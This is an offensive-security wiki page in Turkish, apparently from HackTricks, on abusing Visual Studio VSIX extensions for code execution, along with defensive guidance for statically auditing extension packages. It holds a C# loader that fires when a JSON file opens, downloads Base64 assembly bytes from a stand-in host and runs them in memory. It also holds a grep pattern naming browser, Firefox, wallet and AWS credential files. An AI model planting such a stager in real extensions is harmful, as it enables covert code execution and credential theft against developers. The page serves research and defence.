# Visual Studio VSIX Eklentisi Kötüye Kullanımı

{{#include ../banners/hacktricks-training.md}}

Bir Visual Studio eklentisi, rutin düzenleyici etkinliklerini oturum açmış kullanıcının kimliği altında kod yürütmeye dönüştürebilir. Kötü amaçlı bir VSIX, benzer görünümlü bir yayıncı veya güvenliği ihlal edilmiş bir eklenti güncellemesi, normal yükleme kanalları üzerinden kullanıcıya ulaşabilir. Yönetici izni isteyen bir yükleme, kullanıcının onayladığı bir yükleme yoludur; otomatik bir privilege escalation değildir.<sup>[[1]](#references)</sup>

## Yürütme modeli

Klasik VSSDK eklentileri genellikle `devenv.exe` içinde çalışır. Yeni `VisualStudio.Extensibility` modeli ise modern .NET eklentilerini çoğunlukla işlem dışında çalıştırır: Visual Studio çağrıları özel bir `Microsoft.ServiceHub.Host.Extensibility` işlemine yönlendirir. Bu, IDE'nin kararlılığını korur ancak eklentiyi kullanıcının Windows izinlerinden **sandbox içine almaz**. Çalıştırılabilir dosyanın tam adı, `ServiceHub.Host.Extensibility.arm64.exe` gibi bir mimari soneki içerebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Olağan düzenleyici etkinliğinde tetikleme

Bir eklenti, yalnızca dikkat çeken bir menü komutu sunmak yerine `ITextViewOpenClosedListener` uygulayabilir. `TextViewOpenedAsync` geri çağrısı, eşleşen belgeler için çağrılırken `TextViewExtensionConfiguration.AppliesTo` etkinleştirmeyi JSON gibi yaygın bir türle sınırlandırabilir. Gerçek bir formatter veya linter, bir dosya açıldığında yan etki olarak ikinci bir eylem gerçekleştirirken duyurulan işlevini de yerine getirebilir.<sup>[[1]](#references)[[3]](#references)</sup>

Aşağıdaki sadeleştirilmiş örüntü, önemli yürütme noktalarını gösterir; açıklık açısından meşru formatter'ı ve hata işlemeyi içermez.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Olay tetiklemeli bellek içi yönetilen assembly yükleyicisi</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Bu zincir Base64 metnini indirir, assembly byte'larına çözer, bunları `MemoryStream` üzerinden collectible bir `AssemblyLoadContext` içine yükler, yansıtma yoluyla `EntryPoint`'i parametresiz veya `string[]` ile çağırır, asenkron entry point'leri await eder ve context'i unload eder. İkinci aşama diske yazılmaz; ancak VSIX ve birincil extension DLL'i disk artefaktları olarak kalır. Base64, özgünlük veya gizlilik sağlamaz; HTTP kullanımı da aradaki bir saldırganın yanıtı değiştirmesine olanak tanır.<sup>[[1]](#references)</sup>

Operasyonel varyasyonlar arasında, staging başarısız olduğunda duyurulan özelliğin çalışmaya devam etmesi için tüm exception'ları bastırmak veya düzenlemelerden sonra tetiklenmesi için `ITextViewChangedListener` kullanmak yer alır. Kod, extension host içinde çalışır ve o kullanıcı için kullanılabilir managed API'leri, P/Invoke'u, dosyaları, kimlik bilgilerini ve child process'leri kullanabilir.<sup>[[1]](#references)</sup>

Native plugin autoloading tabanlı, editöre özgü ilgili bir execution surface için bkz.:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace ve dağıtım güveninin kötüye kullanılması

Bir VSIX doğrudan paylaşılan/phishing amaçlı bir dosya olarak, web Marketplace'ten veya Visual Studio'nun yerleşik Marketplace tarayıcısı üzerinden gelebilir. Temelde benzersizliği ve ayrılmış sözcükler listesini denetleyen publisher kaydı, görsel olarak yanıltıcı publisher kimliklerine izin verebilir; zaten güvenilen bir publisher'ı veya extension'ı ele geçirmek daha da etkilidir, çünkü kurulu bir kullanıcı tabanından yararlanır. Marketplace kurulumu Visual Studio Installer'ı çalıştırır ve indirilen VSIX'i geçici olarak `%LOCALAPPDATA%\Temp` altına yerleştirir; `payload.vsix` adı meşru olarak da kullanılır, bu nedenle tek başına dosya adı bir gösterge değildir.<sup>[[1]](#references)</sup>

MDSec, bir extension'ı doğrudan yükleyen bir Visual Studio URL protokolü tespit etmedi. Operatörün yine de kullanıcının VSIX'i yüklemesini/güvenmesini sağlaması veya mevcut bir extension'ın dağıtım yolunu ele geçirmesi gerekir. `AllUsers` paketi Visual Studio kurulum klasörüne yüklenir ve yükseltme isteyebilir; ancak bu, yönetici veya SYSTEM erişimine otomatik bir yol değil, normal ve kullanıcı onayı gerektiren bir installer davranışıdır.<sup>[[1]](#references)[[4]](#references)</sup>

### Büyük ölçekte statik denetim

VSIX paketleri genellikle ZIP kapsayıcılarıdır. Bu nedenle güvenli bir Marketplace inceleme pipeline'ı paketleri sıralayabilir, extension kodunu **yüklemeden** açabilir, manifest'leri ayrıştırabilir, yürütülebilir yüzeyleri belirleyebilir ve managed assembly'leri `ilspycmd` ile decompile edebilir. Yaygın olarak birlikte paketlenen bağımlılıkları hariç tuttuktan sonra extension'a ait assembly'lere öncelik verin; ardından kimlik bilgisi deposuyla ilgili dizeleri, dosya okuma ile ağ üzerinden gönderme, kodlama ile gönderme, indirme ile yürütme, kimlik bilgisi yöneticisi ile ağ erişimi veya ekran görüntüsü alma ile gönderme gibi davranış kümeleriyle ilişkilendirin.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Ayrıca, her yürütme yüzeyinin managed code olduğunu varsaymak yerine native DLL'leri, MSBuild hedeflerini, betikleri, T4 şablonlarını ve yükleyici payload'larını da envantere alın. Şüpheli davranışları manifest'in iddia ettiği amaçla karşılaştırın; telemetry ve meşru güncelleyiciler exfiltration veya staging'e benzeyebilir. Yalnızca statik inceleme; paketlenmiş, gizlenmiş, dinamik olarak çözümlenen ve dormant kodu gözden kaçırır. Yalnızca en son sürümü incelemek de geçmişteki kötü amaçlı sürümlerin gözden kaçmasına yol açar.<sup>[[1]](#references)</sup>

VS Code farklı bir extension host ve manifest kullanır. Otomatik VS Code extension kurulumunu besleyen yazılabilir bir paylaşım için bkz. [VS Code extension drop-share execution](vscode-extension-abuse.md).

Ayrı bir proje yükleme saldırısı, VSIX yüklemeden kötü amaçlı bir [MSBuild `GetFrameworkPaths` hedefini](visual-studio-project-msbuild-execution.md) çalıştırabilir.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Eklentileri Yeniden İncelendi](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility hakkında](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Bir VSIX paketinin yapısı](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET aracı](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel kampanyası Irak altyapısını hedef alıyor](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
